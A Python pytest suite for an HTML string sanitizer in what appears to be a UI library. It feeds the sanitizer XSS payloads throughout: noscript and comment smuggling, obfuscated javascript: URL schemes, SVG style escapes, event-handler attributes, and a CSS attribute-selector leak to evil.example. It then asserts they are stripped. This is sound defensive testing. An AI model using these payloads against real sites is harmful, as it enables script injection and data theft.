"""Locks for the #32 review of the string→HTML allowlist.

- Raw-text elements (``noscript`` and friends) and comments are where the
  Python parser and a browser disagree, so the sanitizer drops them.
- Document mode is chosen by the caller, never by the input.
- Document-mode ``<style>`` text is emitted verbatim, or not at all.
- URL checks hold at the parser, not only in the renderer.
- Unknown elements are unwrapped; custom elements need an explicit opt-in.

Policy: docs/adr/0002-html-string-sanitizer-policy.md.
"""

from __future__ import annotations

import re

import pytest

from ux_dom.dom import Fragment
from ux_dom.dom.htmlelement import HTMLElement
from ux_dom.dom.src import html_string
from ux_dom.dom.src.html_string import StringToHTML, _sanitized_html, defHTML
from ux_dom.dom.src.parse_html import tokenize_html
from ux_dom.dom.src.utils.dom_util import safe_attr_value
from ux_dom.ui.channel_bridge import to_fragment

NOSCRIPT_COMMENT = (
    "<noscript><!-- </noscript><img src=x onerror=alert(1)> --></noscript>"
)

# Every public way a string reaches the sanitizer.
ENTRY_POINTS = {
    "_sanitized_html": _sanitized_html,
    "to_fragment": to_fragment,
    "srcdoc": lambda s: safe_attr_value("srcdoc", s),
    "Fragment": lambda s: str(Fragment(s)),
    "HTMLElement": lambda s: HTMLElement(s).__render__(pretty=False),
}


_LIVE_HANDLER = re.compile(r"<[a-z][^>]*\son", re.I)


def _render(nodes) -> str:
    return "".join(node.__render__(pretty=False) for node in nodes)


# --- raw-text elements and comments --------------------------------------


@pytest.mark.parametrize("entry", sorted(ENTRY_POINTS))
def test_noscript_comment_cannot_smuggle_markup(entry):
    out = ENTRY_POINTS[entry](NOSCRIPT_COMMENT)
    low = out.lower()
    assert "<noscript" not in low, out
    assert "<!--" not in out, out
    assert "<img" not in low, out


@pytest.mark.parametrize(
    "tag", ["noscript", "noembed", "noframes", "xmp", "plaintext", "iframe", "template"]
)
def test_raw_text_elements_are_dropped_with_their_content(tag):
    src = f'<{tag}><p title="</{tag}><img src=x onerror=alert(1)>">t</p></{tag}><b>ok</b>'
    out = _sanitized_html(src)
    assert f"<{tag}" not in out.lower(), out
    assert not _LIVE_HANDLER.search(out), out
    # <plaintext> swallows the rest of the input in Python and in a browser.
    assert out.endswith("<b>ok</b>") or (tag == "plaintext" and out == "")


@pytest.mark.parametrize(
    "src",
    [
        "<!--x-->",
        "<!--><img src=x onerror=alert(1)>-->",
        "<!-- --!><img src=x onerror=alert(1)> -->",
        "<!--a--!><img src=x onerror=alert(1)>-->",
    ],
)
def test_comments_are_dropped(src):
    out = _sanitized_html(src)
    assert "<!--" not in out, out
    assert not _LIVE_HANDLER.search(out), out


def test_comment_inside_element_is_dropped_text_stays():
    assert _sanitized_html("<p>a<!-- b --></p>") == "<p>a</p>"


# --- document mode is explicit -------------------------------------------

HOSTILE_DOCUMENT = (
    "<html><head>"
    "<link rel=stylesheet href=https://evil.example/x.css>"
    "<style>input[value^=a]{background:url(https://evil.example/a)}</style>"
    '<meta http-equiv=set-cookie content="sid=attacker">'
    "</head><body><p>hi</p></body></html>"
)


@pytest.mark.parametrize("entry", sorted(ENTRY_POINTS))
@pytest.mark.parametrize(
    "prefix", ["", "<!DOCTYPE html>", " \n<!doctype html>"]
)
def test_input_cannot_select_document_mode(entry, prefix):
    out = ENTRY_POINTS[entry](prefix + HOSTILE_DOCUMENT).lower()
    assert "<link" not in out
    assert "<style" not in out
    assert "<meta" not in out
    assert "evil.example" not in out
    assert "doctype" not in out
    assert "<p>" in out


def test_defhtml_input_cannot_select_document_mode():
    out = _render(defHTML(HOSTILE_DOCUMENT)).lower()
    assert "<link" not in out and "<style" not in out and "<meta" not in out


def test_document_mode_is_a_caller_keyword():
    out = _render(defHTML("<!DOCTYPE html>" + HOSTILE_DOCUMENT, document=True))
    assert out.startswith("<!DOCTYPE html>")
    assert '<link href="https://evil.example/x.css" rel="stylesheet">' in out
    assert "<style>input[value^=a]" in out
    assert _sanitized_html(HOSTILE_DOCUMENT, document=True) == out.removeprefix(
        "<!DOCTYPE html>"
    )
    node = StringToHTML(HOSTILE_DOCUMENT, document=True).parse()
    assert "<style>" in node.__render__(pretty=False)


def test_document_mode_meta_http_equiv_is_an_allowlist():
    out = _sanitized_html(
        "<html><head>"
        '<meta http-equiv="set-cookie" content="sid=attacker">'
        '<meta http-equiv="content-security-policy" content="script-src *">'
        '<meta http-equiv="Refresh" content="0;url=https://evil.example/">'
        '<meta http-equiv="content-type" content="text/html; charset=utf-8">'
        '<meta charset="utf-8">'
        "</head></html>",
        document=True,
    ).lower()
    assert "set-cookie" not in out
    assert "content-security-policy" not in out
    assert "refresh" not in out
    assert 'http-equiv="content-type"' in out
    assert 'charset="utf-8"' in out


# --- document-mode <style> -----------------------------------------------


def test_document_style_text_is_verbatim():
    css = "a > b{color:red} p::after{content:'&amp;'}"
    out = _sanitized_html(
        f"<html><head><style>{css}</style></head></html>", document=True
    )
    assert f"<style>{css}</style>" in out


@pytest.mark.parametrize(
    "src",
    [
        # foreign content: a browser parses <svg><style> children as markup
        "<html><body><svg><style><img src=x onerror=alert(1)></style></svg></body></html>",
        "<html><head><style>a{content:'</StYlE><img src=x onerror=alert(1)>'}</style></head></html>",
        "<html><head><style>a{content:'<'}</style></head></html>",
    ],
)
def test_document_style_with_markup_is_refused(src):
    out = _sanitized_html(src, document=True).lower()
    # Python ends <style> at ``</StYlE`` like a browser, so any <img> after
    # it is ordinary sanitized markup. What must not exist is a <style> that
    # carries markup, or a live handler.
    assert "onerror" not in out, out
    assert not re.search(r"<style>[^<]*<(?!/style>)", out), out


# --- URL checks at the parser, not only the renderer -----------------------


@pytest.mark.parametrize(
    ("src", "attr"),
    [
        ("<a href='javascript:alert(1)'>x</a>", "href"),
        ("<a href='JaVaScRiPt:alert(1)'>x</a>", "href"),
        ("<a href='jav&#x61;script:alert(1)'>x</a>", "href"),
        ("<a href='&#106;avascript:alert(1)'>x</a>", "href"),
        ("<a href='&#0000106;avascript:alert(1)'>x</a>", "href"),
        ("<a href='jav&#x09;ascript:alert(1)'>x</a>", "href"),
        ("<a href='java\tscript:alert(1)'>x</a>", "href"),
        ("<a href='java\nscript:alert(1)'>x</a>", "href"),
        ("<a href=' \x01\x1fjavascript:alert(1)'>x</a>", "href"),
        ("<a href='java\x00script:alert(1)'>x</a>", "href"),
        ("<a href='javascript&colon;alert(1)'>x</a>", "href"),
        ("<a href='vbscript:msgbox(1)'>x</a>", "href"),
        ("<a href='data:text/html,<script>alert(1)</script>'>x</a>", "href"),
        ("<a href='DATA:TEXT/HTML;base64,PHNjcmlwdD4='>x</a>", "href"),
        ("<svg><a xlink:href='javascript:alert(1)'>x</a></svg>", "xlink:href"),
        ("<svg><use xlink:href='&#x6A;avascript:alert(1)'></use></svg>", "xlink:href"),
        ("<svg><use href='javascript:alert(1)'></use></svg>", "href"),
        ("<form action='javascript:alert(1)'></form>", "action"),
        ("<button formaction='javascript:alert(1)'>x</button>", "formaction"),
        ("<img src='javascript:alert(1)'>", "src"),
        ("<blockquote cite='javascript:alert(1)'>x</blockquote>", "cite"),
        ("<video poster='javascript:alert(1)'></video>", "poster"),
        ("<img srcset='/a.png 1x, javascript:alert(1) 2x'>", "srcset"),
    ],
)
def test_dangerous_scheme_is_dropped_from_parsed_attributes(src, attr):
    """Asserts on the parsed tree, so the renderer's own URL gate cannot mask it."""
    node = StringToHTML(src).parse()
    for element in _walk(node):
        assert attr not in element.attributes, (src, element.attributes)


def test_safe_urls_survive_parsing():
    node = StringToHTML("<a href='/next?a=1'>x</a>").parse()
    assert node.attributes == {"href": "/next?a=1"}
    node = StringToHTML("<svg><use xlink:href='#icon'></use></svg>").parse()
    assert any(e.attributes.get("xlink:href") == "#icon" for e in _walk(node))


@pytest.mark.parametrize(
    "value",
    [
        "javascript:alert(1)",
        " javascript:alert(1)",
        "\x00javascript:alert(1)",
        "java\tscript:alert(1)",
        "java script:alert(1)",
        "JAVASCRIPT:alert(1)",
        "vbscript:x",
        "data:text/html,x",
    ],
)
def test_scheme_is_dangerous_on_decoded_values(value):
    assert html_string._scheme_is_dangerous(value)


def _walk(node):
    stack = [node]
    while stack:
        current = stack.pop()
        if hasattr(current, "attributes"):
            yield current
        stack.extend(getattr(current, "children", []) or [])


# --- unknown elements -----------------------------------------------------

DANGEROUS_CHILDREN = (
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<p onclick=alert(1) hx-get=/admin x-init=alert(1)>t</p>"
    "<a href=javascript:alert(1)>a</a>"
)


@pytest.mark.parametrize(
    "src",
    [
        f"<x-foo>{DANGEROUS_CHILDREN}</x-foo>",
        f"<portal>{DANGEROUS_CHILDREN}</portal>",
        f"<svg><foo>{DANGEROUS_CHILDREN}</foo></svg>",
        f"<svg><x-foo><foo>{DANGEROUS_CHILDREN}</foo></x-foo></svg>",
    ],
)
def test_unwrap_sanitizes_children(src):
    token = tokenize_html(src).children[0]
    parser = StringToHTML([token])
    holder = parser._unwrap(token, None) if token.name != "svg" else parser.parse()
    out = holder.__render__(pretty=False)
    low = out.lower()
    for bad in ("<script", "onerror", "onclick", "hx-get", "x-init", "javascript:"):
        assert bad not in low, (src, out)
    assert "<x-foo" not in low and "<foo" not in low and "<portal" not in low
    assert '<img src="x">' in out
    assert "<p>t</p>" in out


def test_unwrap_into_existing_parent_sanitizes_children():
    token = tokenize_html(f"<x-foo>{DANGEROUS_CHILDREN}</x-foo>").children[0]
    from ux_dom.dom import div

    parent = div()
    StringToHTML([token])._unwrap(token, parent)
    out = parent.__render__(pretty=False)
    assert "onerror" not in out and "<script" not in out and "onclick" not in out
    assert out.startswith("<div>") and "<p>t</p>" in out


def test_custom_elements_are_unwrapped_by_default():
    assert _sanitized_html("<x-counter count='1'>t</x-counter>") == "t"


def test_custom_elements_need_an_explicit_allowlist():
    src = (
        "<x-counter count='1' class='c' onclick='alert(1)' x-init='alert(1)' "
        "data-n='2'>t<img src=x onerror=alert(1)></x-counter><x-other>o</x-other>"
    )
    out = _sanitized_html(src, allow_custom_elements=["x-counter"])
    assert out == '<x-counter class="c" data-n="2">t<img src="x"></x-counter>o'
    out = _render(defHTML(src, allow_custom_elements=["x-*"]))
    assert "<x-counter" in out and "<x-other>o</x-other>" in out
    assert "onclick" not in out and "x-init" not in out and "onerror" not in out


@pytest.mark.parametrize(
    "name", ["script", "iframe", "style", "noscript", "foo", "X-Upper", "annotation-xml", "*"]
)
def test_custom_element_allowlist_rejects_non_custom_names(name):
    with pytest.raises(ValueError):
        _sanitized_html("<p>x</p>", allow_custom_elements=[name])


def test_custom_element_allowlist_cannot_revive_dropped_tags():
    out = _sanitized_html(
        "<x-a><script>alert(1)</script><noscript>n</noscript></x-a>",
        allow_custom_elements=["x-*"],
    )
    assert out == "<x-a></x-a>"


# --- escape=False never bypasses sanitizing -------------------------------


@pytest.mark.parametrize("escape", [True, False])
def test_escape_flag_never_bypasses_sanitizing(escape):
    out = _render(defHTML(NOSCRIPT_COMMENT + DANGEROUS_CHILDREN, escape=escape))
    low = out.lower()
    for bad in ("<script", "onerror", "onclick", "<noscript", "<!--"):
        assert bad not in low, (escape, out)


# --- the one in-package document-mode caller ---------------------------------


def test_component_html_file_is_document_mode_but_string_is_not(tmp_path):
    from pathlib import Path

    from ux_dom.dom import Component

    page = tmp_path / "page.html"
    page.write_text(HOSTILE_DOCUMENT.replace("evil.example", "cdn.example"))

    class FromFile(Component):
        def render(self):
            return Path(page)

    class FromString(Component):
        def render(self):
            return page.read_text()

    from_file = FromFile().__render__(pretty=False)
    assert '<link href="https://cdn.example/x.css" rel="stylesheet">' in from_file
    assert "<style>" in from_file
    from_string = FromString().__render__(pretty=False).lower()
    assert "<link" not in from_string and "<style" not in from_string


# --- round 2 review ---------------------------------------------------------

TRUSTED = "<div><script>ok()</script><b>t</b></div>"


def test_markup_is_trusted_verbatim_on_every_entry_point():
    """ADR 0002 §2: a ``__html__`` value (MarkupSafe ``Markup``, a ``str``
    subclass) never enters the parser, so the ``str`` check must come after it."""
    from markupsafe import Markup

    from ux_dom.dom import Component

    trusted = Markup(TRUSTED)
    assert to_fragment(trusted) == TRUSTED
    assert safe_attr_value("srcdoc", trusted) == TRUSTED
    assert "<script>ok()</script>" in HTMLElement(trusted).__render__(pretty=False)
    assert "<script>ok()</script>" in str(Fragment(trusted))

    class Trusted(Component):
        def render(self):
            return trusted

    assert "<script>ok()</script>" in Trusted().__render__(pretty=False)

    # The same text as a plain str is still sanitized everywhere.
    for entry in ENTRY_POINTS.values():
        assert "<script" not in entry(TRUSTED)


@pytest.mark.parametrize(
    "src",
    [
        '<p data-a"b=1>x</p>',
        "<p aria-a'b=1>x</p>",
        "<p data-\x01=1>x</p>",
        "<p data-a\x7fb=1>x</p>",
        "<p data-a<b=1>x</p>",
    ],
)
def test_unrenderable_attribute_names_are_dropped_not_raised(src):
    assert _sanitized_html(src) == "<p>x</p>"
    assert "<p>" in str(Fragment(src))


@pytest.mark.parametrize(
    "src",
    [
        "<html><body><svg><style>a{fill:red}</style></svg></body></html>",
        "<html><body><svg><g><style>a{}</style></g></svg></body></html>",
        "<html><body><math><style>a{}</style></math></body></html>",
        "<html><body><svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg></body></html>",
    ],
)
def test_document_style_in_foreign_content_is_dropped(src):
    out = _sanitized_html(src, document=True).lower()
    assert "<style" not in out, out


def test_document_style_outside_foreign_content_is_kept():
    out = _sanitized_html(
        "<html><head><style>a{}</style></head><body><svg></svg></body></html>",
        document=True,
    )
    assert "<style>a{}</style>" in out


@pytest.mark.parametrize(
    ("src", "text"),
    [
        ("<p>&AMP; &LT; &GT; &QUOT;</p>", '& < > "'),
        ("<p>&amp; &lt; &gt; &quot;</p>", '& < > "'),
        ("<p>AT&T</p>", "AT&T"),
        ("<p>&notanentity;</p>", "&notanentity"),
    ],
)
def test_named_references_decode_like_a_browser(src, text):
    import html as _html

    out = _sanitized_html(src)
    assert out.startswith("<p>") and out.endswith("</p>")
    inner = out[3:-4]
    assert "<" not in inner
    assert _html.unescape(inner).rstrip(";") == text


@pytest.mark.parametrize(
    ("src", "expected"),
    [
        ("a <b>x</b> <i>y</i>", "a <b>x</b> <i>y</i>"),
        ("<p><b>Hello</b> <i>world</i></p>", "<p><b>Hello</b> <i>world</i></p>"),
        ("<p>&lt; &gt;</p>", "<p>&lt; &gt;</p>"),
    ],
)
def test_inline_whitespace_between_tags_is_kept(src, expected):
    assert _sanitized_html(src) == expected
